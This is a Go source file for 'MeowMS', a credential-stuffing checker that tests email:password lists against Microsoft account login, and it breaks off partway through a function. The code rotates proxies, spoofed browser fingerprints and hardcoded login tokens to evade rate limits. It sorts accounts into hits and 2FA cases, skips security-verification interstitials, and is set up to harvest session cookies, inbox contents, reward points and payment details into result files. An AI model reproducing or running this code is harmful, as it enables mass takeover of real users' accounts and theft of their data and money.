// MeowMS — Advanced Microsoft Mail Checker v1.0
// Built by Rivansoul | MeowMal Dev's
// Rebuilt from: oggy.py, meow(2).py, main.py, main-7.py

package main

import (
	"archive/zip"
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/net/proxy"
)

// ─── INI Config Parser ───────────────────────────────────────────────

type iniConfig map[string]map[string]string

func parseINI(path string) iniConfig {
	out := iniConfig{}
	f, err := os.Open(path)
	if err != nil {
		return out
	}
	defer f.Close()
	section := "default"
	out[section] = map[string]string{}
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		line := strings.TrimSpace(sc.Text())
		if line == "" || strings.HasPrefix(line, ";") || strings.HasPrefix(line, "#") {
			continue
		}
		if strings.HasPrefix(line, "[") && strings.HasSuffix(line, "]") {
			section = strings.ToLower(line[1 : len(line)-1])
			if _, ok := out[section]; !ok {
				out[section] = map[string]string{}
			}
			continue
		}
		if idx := strings.IndexByte(line, '='); idx > 0 {
			key := strings.TrimSpace(strings.ToLower(line[:idx]))
			val := strings.TrimSpace(line[idx+1:])
			// strip inline comment
			if ci := strings.Index(val, " ;"); ci > 0 {
				val = strings.TrimSpace(val[:ci])
			}
			out[section][key] = val
		}
	}
	if err := sc.Err(); err != nil {
		fmt.Printf("[%s!%s] Error parsing INI file '%s': %v\n", cRed, cReset, path, err)
	}
	return out
}

func (c iniConfig) get(section, key, def string) string {
	if s, ok := c[section]; ok {
		if v, ok := s[key]; ok && v != "" {
			return v
		}
	}
	return def
}

func (c iniConfig) getInt(section, key string, def int) int {
	v := c.get(section, key, "")
	if n, err := strconv.Atoi(v); err == nil {
		return n
	}
	return def
}

// ─── Paths ────────────────────────────────────────────────────────────

const (
	accFile    = "acc.txt"
	proxyFile  = "proxies.txt"
	inboxFile  = "inbox.txt"
	resultDir  = "Result"
	countryDir = "Result/country_sorted"
	msFile     = "Result/ms.txt"
	twofaFile  = "Result/twofa.txt"
	ptsFile    = "Result/pts.txt"
	payFile    = "Result/payment.txt"
	cookiesDir = "Result/cookies"
	cookiesZip = "Result/cookies.zip"
	inboxDir   = "Result/Inbox"
)

// ─── Timeouts ─────────────────────────────────────────────────────────

const (
	tLogin   = 6 * time.Second  // fast-fail: ms account responds in <2s normally
	tReward  = 5 * time.Second
	tInbox   = 7 * time.Second
	tPayment = 6 * time.Second
	tCookie  = 3 * time.Second
)

// ─── ANSI Colors ──────────────────────────────────────────────────────

const (
	cReset   = "\033[0m"
	cRed     = "\033[31m"
	cGreen   = "\033[32m"
	cYellow  = "\033[33m"
	cCyan    = "\033[36m"
	cWhite   = "\033[37m"
	cBGreen  = "\033[92m"
	cBCyan   = "\033[96m"
	cBYellow = "\033[93m"
	cBold    = "\033[1m"
)

// ─── User Agents ──────────────────────────────────────────────────────

var (
	uaWinChrome = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
	uaWinEdge   = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
	uaWinBrave  = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Brave/1.60.110"
	uaMacChrome = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
	uaIphone    = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
	uaDesk      = uaWinEdge
	// Mobile UAs Android 8-12
	uaMobile = []string{
		"Mozilla/5.0 (Linux; Android 8.1.0; Nexus 6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; Pixel 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
	}
	_ = uaWinBrave // used in config rotation
)

// ─── Login Config ─────────────────────────────────────────────────────

type loginCfg struct {
	ua     string
	rawURL string
	ppft   string
	cookie string
}

var (
	cfgLock    sync.Mutex
	cfgToomany = make([]int, 5)
	cfgResetAt = make([]float64, 5)
)

func buildConfigs() []loginCfg {
	uid1 := randUUID()
	uid2 := randUUID()
	uid3 := randUUID()
	return []loginCfg{
		// 0 — Windows Chrome
		{
			ua: uaWinChrome,
			rawURL: "https://login.live.com/ppsecure/post.srf" +
				"?username=%7bemail%7d&client_id=0000000048170EF2" +
				"&contextid=072929F9A0DD49A4&opid=D34F9880C21AE341" +
				"&bk=1765024327&uaid=a5b22c26bc704002ac309462e8d061bb&pid=15216&prompt=none",
			ppft: "-Drzud3DzKKJtVD9IfM5xwJywwEjJp5zvvJmrSyu*RKOf!PbgSCQ7ReuKFS*sIpTV5r28epGtqBhqH3JYvND4!onwSWz2JEkvdeewUQC6HmAXRgjYBzSlf0mjEYbx3ULc7oy5fUK3LDSb*CnkAG03FLzwVPmT5WjYu4sE5Wqd93pCx0USJK4jelAWNvsMog0Rmj90tmeCd*1pDYjkINyPEgQSkv6y5GPuX!GmYwKccALUt*!SRaI02p*XUqePtNtJzw$$",
			cookie: "MSPRequ=id=N&lt=1765024327&co=1; uaid=a5b22c26bc704002ac309462e8d061bb; MSPOK=$uuid-90ce4cdb-2718-4d7e-9889-4136cfacc5b2; OParams=11O.DhmByHnT9kscyud7VyWQt5uWQuQOYWZ9O2v5E49mKxVoKsSZaB4KnwkAQCVjghW9A6M8syem4sO!g4KOfietehdD7U2eXeVo8eUsorIQv1deGf6v43egdNizv1*agwrVh2OTg7pu2SRE3SougNTvzlNUNe1BgtO4HFlLRm6UoEW3PNBIxuVPmFBiPs0wEU162jlfO8yA1!QZV7KKArG8NPChj0kf1IOfR95k0fIfa0!fDW8Md44pKHa3rkU0Um0KB03YEBdWMOAbJlX5RONIL3M31WhD4LG3GPAoBPAMCN9fMk2rHlwix8g6MOW3HKxDT4I0TlKrYHDBJejZWSmI23T3v2kr1MKaL9vEQoaTwOJf9VloMFBi7yB!kisHZn0BkjE!HGWhaliwYdluhJUCu1g$",
		},
		// 1 — Windows Edge
		{
			ua: uaWinEdge,
			rawURL: "https://login.live.com/ppsecure/post.srf" +
				"?username=%7bemail%7d&client_id=0000000048170EF2" +
				"&contextid=F3FB0F6AB3D6991E&opid=5F188DEDF4A1266A" +
				"&bk=1768757278&uaid=b1d1e6fbf8b24f9b8a73b347b178d580&pid=15216&prompt=none",
			ppft:   "-Dm65IQ!FOoxUaTQnZAHxYJMOmOcAmTQz4qm3kTra6EWGgOJS3HmmMLM4kwOpB*SxcpnorGvu6Meyzvos0ruiOkVKAh!SdkWlD5KUiiUUpVaBaRmY4op*aKCNkOPi2mBbWnS0mXOvSG7dMuL!5HdVFTPtGTdlQZCucF7LVMbr2BWN6qhWxoXXrBMfvx3BcxGFhNZgbDooHcWy8QO4OOYEXVI2ee3UOWa!S2qTtgO3nriTV67BP7!q8QgpyDMkckNSHQ$$",
			cookie: "MSFPC=GUID=cd3df40453784149a05eb0e8d7b0aaf5&HASH=cd3d&LV=202510&V=4&LU=1761393873491; MUID=009CC129162F6E173020D77717446F0A; uaid=b1d1e6fbf8b24f9b8a73b347b178d580; MSPRequ=id=N&lt=1768757278&co=1; MSPOK=$uuid-" + uid1,
		},
		// 2 — Mac Chrome / Xbox
		{
			ua: uaMacChrome,
			rawURL: "https://login.live.com/ppsecure/post.srf" +
				"?username=%7bemail%7d&client_id=000000004C12AE6F" +
				"&contextid=A9B8C7D6E5F40321&opid=1A2B3C4D5E6F7890" +
				"&bk=1760000001&uaid=c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8&pid=15216&prompt=none",
			ppft:   "-DxY9Z*wV4U!tS8rQ3p2NmLkJiHgFeDcBaZyXwVuTsRqPoNnMlKjIhGfEdCbAzYxWvUtSrQpOnMlKjIhGfEdCbAzYxWvUtSrQpOnMlKjIhGfEdCbAzYxWvUtSrQpOnMlKjIhGfEdCbAzYxWvUtSrQpOnMlKjIhGfEdCb$$",
			cookie: "MSFPC=GUID=" + randHex(16) + "&HASH=ab12&LV=202503&V=4; MUID=" + strings.ToUpper(randHex(16)) + "; uaid=c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8; MSPRequ=id=N&lt=1760000001&co=1; MSPOK=$uuid-" + uid2,
		},
		// 3 — Android Mobile
		{
			ua: uaMobile[rand.Intn(len(uaMobile))],
			rawURL: "https://login.live.com/ppsecure/post.srf" +
				"?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf" +
				"&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en",
			ppft:   "-Da1B2C3D4E5F6G7H8I9J0K1L2M3N4O5P6Q7R8S9T0U1V2W3X4Y5Z6a7b8c9d0e1f2g3h4i5j6k7l8m9n0o1p2q3r4s5t6u7v8w9x0y1z2A3B4C5D6E7F8G9H0I1J2K3L4M5N6O7P8Q9R0S1T2U3V4W5X6Y7Z8a9b0c1d2e3f4g5h6i7j8k9l0m1n2o3$$",
			cookie: "MSFPC=GUID=" + randHex(16) + "&HASH=" + randHex(2) + "&LV=202504&V=4; MUID=" + strings.ToUpper(randHex(16)) + "; uaid=" + randHex(16) + "; MSPOK=$uuid-" + uid3,
		},
		// 4 — iPhone Safari
		{
			ua: uaIphone,
			rawURL: "https://login.live.com/ppsecure/post.srf" +
				"?client_id=0000000048170EF2&contextid=E5D8A9B73286B7E0&opid=EED8E3DBCC1AAA6A" +
				"&bk=1726223182&uaid=3d0f0eea617a4b9ca747100934dca583&pid=15216",
			ppft:   "-Dthk7KM0CcBognHLIww755uCZB5!Bu7m0e12TJTvKQxteHh9t6VfghqUlt7cYV4*a!RMEJTP9hmig2BsgHRUrv2uDOS9ATAi4O!tGitoYrHZifX5YWtvttGdTH3624e8BFApW!PxPogDIIFO8P5N5D9IdEtmsTG87fjOlbYry3wl20FV7nt4YM7mlRZDnd*c7HjVpbIE!eAr0HCbiX9SUJYKmdpvfqCC!y6GNCug!1cRYmi!k!Tp4blIALTbVOAh9A$$",
			cookie: "MSPRequ=id=N&lt=1726223182&co=1; uaid=3d0f0eea617a4b9ca747100934dca583; MSPOK=$uuid-" + randUUID() + "; OParams=11O.DsdeQF2y3fsl3M9I0rhb6w95IwZaderdmXLRh6pKeUGbd1PqLEw8JTc28KdKuOsGYu!PzrPkEGJhuQmW*uMSRDsAjGDX0QElSnaFWMErTliKbWK5a9BWYp2c!aK8z1lwcscrbAr1548TFJxSZPl!9Eqk08i0mhxSQsfi7uARKID6R49B4664XQmPGN3CUdfFYjYwW4",
		},
	}
}

// ─── Stats ────────────────────────────────────────────────────────────

var (
	statHits    int64
	statBad     int64
	statBlocked int64
	stat2FA     int64
	statChecked int64
	statTotal   int64
	startTime   time.Time
	printLock   sync.Mutex
)

func incrHits()    { atomic.AddInt64(&statHits, 1); updateTitle() }
func incrBad()     { atomic.AddInt64(&statBad, 1); updateTitle() }
func incrBlocked() { atomic.AddInt64(&statBlocked, 1); updateTitle() }
func incr2FA()     { atomic.AddInt64(&stat2FA, 1); updateTitle() }
func incrChecked() { atomic.AddInt64(&statChecked, 1) }

func getCPM() int {
	elapsedSec := time.Since(startTime).Seconds()
	if elapsedSec < 1 {
		return 0
	}
	return int(float64(atomic.LoadInt64(&statChecked)) / elapsedSec * 60)
}

func updateTitle() {
	h := atomic.LoadInt64(&statHits)
	b := atomic.LoadInt64(&statBad)
	bl := atomic.LoadInt64(&statBlocked)
	tfa := atomic.LoadInt64(&stat2FA)
	t := atomic.LoadInt64(&statTotal)
	ch := atomic.LoadInt64(&statChecked)
	cpm := getCPM()
	s := fmt.Sprintf("MeowMS | CPM: %d | Hits: %d | Bad: %d | 2FA: %d | Blocked: %d | Checked: %d/%d",
		cpm, h, b, tfa, bl, ch, t)
	_ = runtime.GOOS
	fmt.Printf("\033]0;%s\007", s)
}

// ─── Helpers ──────────────────────────────────────────────────────────

var rng = rand.New(rand.NewSource(time.Now().UnixNano()))

func randHex(n int) string {
	const hex = "0123456789abcdef"
	b := make([]byte, n*2)
	for i := range b {
		b[i] = hex[rng.Intn(16)]
	}
	return string(b)
}

func randUUID() string {
	h := randHex(16)
	return fmt.Sprintf("%s-%s-%s-%s-%s", h[0:8], h[8:12], h[12:16], h[16:20], h[20:32])
}

func elapsed() string {
	d := time.Since(startTime)
	h := int(d.Hours())
	m := int(d.Minutes()) % 60
	s := int(d.Seconds()) % 60
	return fmt.Sprintf("%02d:%02d:%02d", h, m, s)
}

// ─── Proxy Manager ────────────────────────────────────────────────────

type proxyData struct {
	hits  []time.Time
	banAt time.Time
}

var (
	prxLock sync.Mutex
	prxMap  = map[string]*proxyData{}
)

func normProxy(raw string) string {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return ""
	}
	if strings.Contains(raw, "://") {
		return raw
	}
	return "http://" + raw
}

func prxHit(u string) {
	if u == "" {
		return
	}
	prxLock.Lock()
	defer prxLock.Unlock()
	d, ok := prxMap[u]
	if !ok {
		d = &proxyData{}
		prxMap[u] = d
	}
	now := time.Now()
	fresh := d.hits[:0]
	for _, t := range d.hits {
		if now.Sub(t) < 60*time.Second {
			fresh = append(fresh, t)
		}
	}
	fresh = append(fresh, now)
	d.hits = fresh
	if len(fresh) >= 10 {
		d.banAt = now.Add(time.Duration(20+rng.Intn(40)) * time.Second)
	}
}

func prxOK(u string) bool {
	if u == "" {
		return true
	}
	prxLock.Lock()
	defer prxLock.Unlock()
	d, ok := prxMap[u]
	if !ok {
		return true
	}
	if time.Now().Before(d.banAt) {
		return false
	}
	return true
}

func pickProxy(proxies []string) string {
	if len(proxies) == 0 {
		return ""
	}
	var ok []string
	for _, p := range proxies {
		if prxOK(p) {
			ok = append(ok, p)
		}
	}
	if len(ok) > 0 {
		return ok[rng.Intn(len(ok))]
	}
	return proxies[rng.Intn(len(proxies))]
}

// cfgOrder returns config indices sorted by least rate-limiting
func cfgOrder() []int {
	cfgLock.Lock()
	defer cfgLock.Unlock()
	idx := []int{0, 1, 2, 3, 4}
	sort.Slice(idx, func(a, b int) bool {
		return cfgToomany[idx[a]] < cfgToomany[idx[b]]
	})
	return idx
}

func recordToomany(i int) {
	if i < 0 {
		return
	}
	cfgLock.Lock()
	defer cfgLock.Unlock()
	now := float64(time.Now().Unix())
	if now-cfgResetAt[i] > 90 {
		cfgToomany[i] = 0
		cfgResetAt[i] = now
	}
	cfgToomany[i]++
}

// ─── HTTP Client Factory ──────────────────────────────────────────────

func newClient(proxyURL string, ua string) *http.Client {
	jar, _ := cookiejar.New(nil)
	tlsCfg := &tls.Config{
		InsecureSkipVerify: true,
		MinVersion:         tls.VersionTLS12,
		CipherSuites: []uint16{
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
		},
	}
	transport := &http.Transport{
		TLSClientConfig:     tlsCfg,
		MaxIdleConns:        200,
		MaxIdleConnsPerHost: 50,
		IdleConnTimeout:     60 * time.Second,
		DisableKeepAlives:   false,
		ForceAttemptHTTP2:   false,
	}
	if proxyURL != "" {
		if strings.HasPrefix(proxyURL, "socks5://") || strings.HasPrefix(proxyURL, "socks4://") {
			dialer, err := proxy.SOCKS5("tcp", strings.TrimPrefix(strings.TrimPrefix(proxyURL, "socks5://"), "socks4://"), nil, proxy.Direct)
			if err == nil {
				transport.DialContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
					return dialer.Dial(network, addr)
				}
			}
		} else {
			pu, err := url.Parse(proxyURL)
			if err == nil {
				transport.Proxy = http.ProxyURL(pu)
			}
		}
	}
	_ = ua
	return &http.Client{
		Jar:       jar,
		Transport: transport,
		Timeout:   30 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 10 {
				return http.ErrUseLastResponse
			}
			return nil
		},
	}
}

func doGet(client *http.Client, rawURL string, hdrs map[string]string, timeout time.Duration) (*http.Response, string, error) {
	req, err := http.NewRequest("GET", rawURL, nil)
	if err != nil {
		return nil, "", err
	}
	for k, v := range hdrs {
		req.Header.Set(k, v)
	}
	client.Timeout = timeout
	resp, err := client.Do(req)
	if err != nil {
		return nil, "", err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	return resp, string(body), nil
}

func doPost(client *http.Client, rawURL string, form url.Values, hdrs map[string]string, timeout time.Duration, noRedirect bool) (*http.Response, string, error) {
	req, err := http.NewRequest("POST", rawURL, strings.NewReader(form.Encode()))
	if err != nil {
		return nil, "", err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	for k, v := range hdrs {
		req.Header.Set(k, v)
	}
	savedRedirect := client.CheckRedirect
	if noRedirect {
		client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		}
	}
	client.Timeout = timeout
	resp, err := client.Do(req)
	if noRedirect {
		client.CheckRedirect = savedRedirect
	}
	if err != nil {
		if resp == nil {
			return nil, "", err
		}
	}
	if resp == nil {
		return nil, "", fmt.Errorf("nil response")
	}
	if resp.Body != nil {
		defer resp.Body.Close()
		body, _ := io.ReadAll(resp.Body)
		return resp, string(body), nil
	}
	return resp, "", nil
}

func doPostJSON(client *http.Client, rawURL string, payload interface{}, hdrs map[string]string, timeout time.Duration) (*http.Response, string, error) {
	data, _ := json.Marshal(payload)
	req, err := http.NewRequest("POST", rawURL, bytes.NewReader(data))
	if err != nil {
		return nil, "", err
	}
	req.Header.Set("Content-Type", "application/json")
	for k, v := range hdrs {
		req.Header.Set(k, v)
	}
	client.Timeout = timeout
	resp, err := client.Do(req)
	if err != nil {
		return nil, "", err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	return resp, string(body), nil
}

// ─── Cookie Helpers ───────────────────────────────────────────────────

func getCookie(client *http.Client, name string) string {
	u, _ := url.Parse("https://login.live.com")
	for _, c := range client.Jar.Cookies(u) {
		if c.Name == name {
			return c.Value
		}
	}
	// try microsoft.com
	u2, _ := url.Parse("https://account.microsoft.com")
	for _, c := range client.Jar.Cookies(u2) {
		if c.Name == name {
			return c.Value
		}
	}
	return ""
}

func allCookies(client *http.Client) []*http.Cookie {
	seen := map[string]bool{}
	var out []*http.Cookie
	domains := []string{
		"https://login.live.com",
		"https://account.live.com",
		"https://account.microsoft.com",
		"https://outlook.live.com",
		"https://www.bing.com",
		"https://www.xbox.com",
	}
	for _, d := range domains {
		u, _ := url.Parse(d)
		for _, c := range client.Jar.Cookies(u) {
			key := c.Domain + "|" + c.Name
			if !seen[key] {
				seen[key] = true
				out = append(out, c)
			}
		}
	}
	return out
}

// ─── Fresh PPFT Fetch ─────────────────────────────────────────────────

type ppftResult struct {
	urlPost string
	ppft    string
	cookie  string
	ua      string
}

func getFreshPPFT(email, proxyURL string) *ppftResult {
	for _, ua := range []string{uaWinChrome, uaWinEdge} {
		client := newClient(proxyURL, ua)
		params := url.Values{
			"client_id":     {"0000000048170EF2"},
			"redirect_uri":  {"https://login.live.com/oauth20_desktop.srf"},
			"response_type": {"token"},
			"scope":         {"offline_access openid profile service::outlook.office.com::MBI_SSL"},
			"display":       {"touch"},
			"login_hint":    {email},
		}
		reqURL := "https://login.live.com/oauth20_authorize.srf?" + params.Encode()
		hdrs := map[string]string{
			"User-Agent":        ua,
			"Accept":            "text/html,application/xhtml+xml,*/*",
			"Accept-Language":   "en-US,en;q=0.9",
			"client-request-id": randUUID(),
		}
		resp, body, err := doGet(client, reqURL, hdrs, 12*time.Second)
		if err != nil || resp.StatusCode != 200 {
			continue
		}
		// Extract urlPost
		var urlPost string
		for _, marker := range []string{`"urlPost":"`, `'urlPost':'`} {
			if idx := strings.Index(body, marker); idx >= 0 {
				rest := body[idx+len(marker):]
				end := strings.IndexByte(rest, '"')
				if end < 0 {
					end = strings.IndexByte(rest, '\'')
				}
				if end > 0 {
					urlPost = rest[:end]
					break
				}
			}
		}
		if urlPost == "" {
			continue
		}
		// Extract PPFT
		var ppft string
		patterns := []struct{ start, end string }{
			{`name=\"PPFT\" id=\"i0327\" value=\"`, `\"`},
			{`name="PPFT" id="i0327" value="`, `"`},
			{`"sFT":"`, `"`},
			{`'sFT':'`, `'`},
		}
		for _, p := range patterns {
			if idx := strings.Index(body, p.start); idx >= 0 {
				rest := body[idx+len(p.start):]
				end := strings.Index(rest, p.end)
				if end > 20 && end < 600 {
					ppft = rest[:end]
					break
				}
			}
		}
		if ppft == "" {
			continue
		}
		// Build cookie string from response
		var parts []string
		cookieURL, _ := url.Parse("https://login.live.com")
		for _, c := range client.Jar.Cookies(cookieURL) {
			for _, key := range []string{"MSPRequ", "uaid", "MSPOK", "OParams", "MSFPC", "MUID"} {
				if c.Name == key {
					parts = append(parts, c.Name+"="+c.Value)
				}
			}
		}
		if len(parts) == 0 {
			parts = []string{"MSPOK=$uuid-" + randUUID()}
		}
		return &ppftResult{
			urlPost: urlPost,
			ppft:    ppft,
			cookie:  strings.Join(parts, "; "),
			ua:      ua,
		}
	}
	return nil
}

// ─── Login Result Types ───────────────────────────────────────────────

type loginResult int

const (
	lrBad    loginResult = iota // wrong creds
	lrTwoFA                     // 2FA / blocked
	lrRotate                    // transient, try next config
	lrHit                       // success
)

type hitResult struct {
	client *http.Client
	token  string // access_token (may be empty)
}

// ─── Single Login Attempt ─────────────────────────────────────────────

func attempt(client *http.Client, email, password, loginURL, ppft, cookie, ua string, cfgIdx int, proxyURL string) (loginResult, *hitResult) {
	form := url.Values{
		"ps": {"2"}, "psRNGCDefaultType": {"1"},
		"psRNGCEntropy": {""}, "psRNGCSLK": {ppft},
		"canary": {""}, "ctx": {""}, "hpgrequestid": {""},
		"PPFT": {ppft}, "PPSX": {"Pas"}, "NewUser": {"1"},
		"FoundMSAs": {""}, "fspost": {"0"}, "i21": {"0"},
		"CookieDisclosure": {"0"}, "IsFidoSupported": {"1"},
		"isSignupPost": {"0"}, "isRecoveryAttemptPost": {"0"},
		"i13": {"1"}, "login": {email}, "loginfmt": {email},
		"type": {"11"}, "LoginOptions": {"1"}, "lrt": {""},
		"lrtPartition": {""}, "hisRegion": {""}, "hisScaleUnit": {""},
		"passwd": {password},
	}
	hdrs := map[string]string{
		"Cookie":                  cookie,
		"User-Agent":              ua,
		"Referer":                 "https://login.live.com/",
		"Origin":                  "https://login.live.com",
		"Accept":                  "text/html,application/xhtml+xml,*/*;q=0.8",
		"Accept-Language":         "en-US,en;q=0.9",
		"Accept-Encoding":         "gzip, deflate",
		"Sec-Fetch-Dest":          "document",
		"Sec-Fetch-Mode":          "navigate",
		"Sec-Fetch-Site":          "same-origin",
		"Upgrade-Insecure-Requests": "1",
	}
	c429, c5xx, toomany, maxIter := 0, 0, 0, 0
	for {
		maxIter++
		if maxIter > 8 { // hard cap — never spin forever
			return lrRotate, nil
		}
		resp, body, err := doPost(client, loginURL, form, hdrs, tLogin, true)
		if err != nil {
			return lrRotate, nil
		}
		code := resp.StatusCode
		if code == 429 {
			c429++
			if c429 >= 2 { // bail faster on rate-limit
				recordToomany(cfgIdx)
				prxHit(proxyURL)
				return lrRotate, nil
			}
			prxHit(proxyURL)
			time.Sleep(500 * time.Millisecond) // short sleep, move on fast
			continue
		}
		if code >= 500 {
			c5xx++
			if c5xx >= 2 {
				return lrRotate, nil
			}
			time.Sleep(300 * time.Millisecond)
			continue
		}
		loc := resp.Header.Get("Location")
		if strings.Contains(loc, "access_token=") {
			tok := extractParam(loc, "access_token")
			if tok != "" && tok != "None" {
				return lrHit, &hitResult{client: client, token: tok}
			}
		}
		if strings.Contains(loc, "srf?code=") || strings.Contains(loc, "oauth20_desktop.srf?") {
			return lrHit, &hitResult{client: client}
		}
		// Check cookies for success
		if getCookie(client, "ANON") != "" || getCookie(client, "WLSSC") != "" {
			return lrHit, &hitResult{client: client}
		}
		bodyL := strings.ToLower(body)
		// Too many times
		toomanyKws := []string{
			"you have tried too many times", "tried too many",
			"too many incorrect password", ",ac:null,",
			"please retry with a different device", "another sign-in method",
			"we're having trouble", "something went wrong",
		}
		if containsAny(bodyL, toomanyKws) {
			recordToomany(cfgIdx)
			prxHit(proxyURL)
			toomany++
			if toomany >= 1 { // rotate immediately on toomany
				return lrRotate, nil
			}
			continue
		}
		// Bad credentials
		badKws := []string{
			"your account or password is incorrect", "password is incorrect",
			"that microsoft account doesn't exist", "account doesn't exist",
			"we couldn't find an account", "incorrect username or password",
			"the email address or password is incorrect",
			"sign-in name or password does not match",
		}
		if containsAny(bodyL, badKws) {
			return lrBad, nil
		}
		// 2FA / blocked
		tfaKws := []string{
			"two-step verification", "two-step", "two factor",
			"verify your identity", "verification code",
			"enter the code", "authenticator app",
			"microsoft authenticator", "approve the request",
			"sign-in was blocked", "account is locked",
			"account has been locked", "unusual activity",
			"suspicious activity", "confirm your identity",
			"help us protect your account", "keep your account secure",
			"we need to verify", "prove it's you",
		}
		tfaRaw := []string{"/cancel?mkt=", "/abuse?mkt=", "/Abuse?mkt=", "identity/confirm", "account.live.com/recover?mkt", "/Proofs/Verify", "proofs/verify"}
		if containsAny(bodyL, tfaKws) || containsAny(body, tfaRaw) {
			return lrTwoFA, nil
		}
		// Bypass interstitials
		if strings.Contains(body, "account.live.com/proofs/Add") || strings.Contains(body, "account.live.com/proofs/add") {
			bypassProofs(client, body)
			return lrHit, &hitResult{client: client}
		}
		if strings.Contains(body, "privacynotice.account.microsoft.com") || strings.Contains(body, "privacy.microsoft.com") {
			bypassPrivacy(client, body)
			return lrHit, &hitResult{client: client}
		}
		if strings.Contains(body, "account.live.com/recover") || strings.Contains(body, "account.live.com/ReputationCheck") {
			if bypassUpdate(client, body) {
				return lrHit, &hitResult{client: client}
			}
		}
		// Explicit success
		successKws := []string{
			"account.microsoft.com", "signout?", "Sign out", "/SignOut",
			"profile.live.com", "sSigninName", "www.xbox.com/en-US/",
			"outlook.live.com/mail",
		}
		if containsAny(body, successKws) {
			return lrHit, &hitResult{client: client}
		}
		// Redirect success
		if code >= 301 && code <= 308 {
			redirectSuccessKws := []string{"account.microsoft.com", "outlook.live.com", "www.bing.com", "www.xbox.com"}
			if containsAny(loc, redirectSuccessKws) {
				return lrHit, &hitResult{client: client}
			}
		}
		return lrRotate, nil
	}
}

// ─── Main Login Orchestrator ──────────────────────────────────────────
// Speed: use static configs first (no extra HTTP roundtrip), fresh PPFT only as last resort

func doLogin(email, password string, proxies []string, configs []loginCfg) (loginResult, *hitResult) {
	// 1. Rotate static configs (fast — no extra HTTP roundtrip)
	for _, i := range cfgOrder() {
		if i >= len(configs) {
			continue
		}
		cfg := configs[i]
		prx := pickProxy(proxies)
		c := newClient(prx, cfg.ua)
		lr, hr := attempt(c, email, password, cfg.rawURL, cfg.ppft, cfg.cookie, cfg.ua, i, prx)
		if lr != lrRotate {
			return lr, hr
		}
		cfgLock.Lock()
		hadToomany := cfgToomany[i] > 0
		cfgLock.Unlock()
		if hadToomany {
			time.Sleep(time.Duration(150+rng.Intn(300)) * time.Millisecond)
		}
	}
	// 2. Fresh PPFT fallback (slower but more reliable)
	prx2 := pickProxy(proxies)
	fresh := getFreshPPFT(email, prx2)
	if fresh != nil {
		c := newClient(prx2, fresh.ua)
		lr, hr := attempt(c, email, password, fresh.urlPost, fresh.ppft, fresh.cookie, fresh.ua, -1, prx2)
		if lr != lrRotate {
			return lr, hr
		}
	}
	// All paths exhausted
	return lrRotate, nil
}

// ─── Bypass Handlers ──────────────────────────────────────────────────

func extractHidden(body, name string) string {
	patterns := []string{
		`name="` + name + `" id="` + name + `" value="`,
		`id="` + name + `" name="` + name + `" value="`,
		`name="` + name + `" value="`,
		`id="` + name + `" value="`,
	}
	for _, p := range patterns {
		if idx := strings.Index(body, p); idx >= 0 {
			rest := body[idx+len(p):]
			end := strings.IndexByte(rest, '"')
			if end > 0 {
				return rest[:end]
			}
		}
	}
	return ""
}

func extractAction(body, formID string) string {
	patterns := []string{
		`id="` + formID + `" method="post" action="`,
		`id="` + formID + `" action="`,
		`method="post" id="` + formID + `" action="`,
	}
	for _, p := range patterns {
		if idx := strings.Index(body, p); idx >= 0 {
			rest := body[idx+len(p):]
			end := strings.IndexByte(rest, '"')
			if end > 0 {
				v := rest[:end]
				if strings.Contains(v, "http") {
					return v
				}
			}
		}
	}
	return ""
}

func bypassProofs(client *http.Client, body string) {
	fmhf := extractAction(body, "fmHF")
	if fmhf == "" {
		fmhf = extractAction(body, "iProofsForm")
	}
	if fmhf == "" {
		return
	}
	form := url.Values{
		"ipt":   {extractHidden(body, "ipt")},
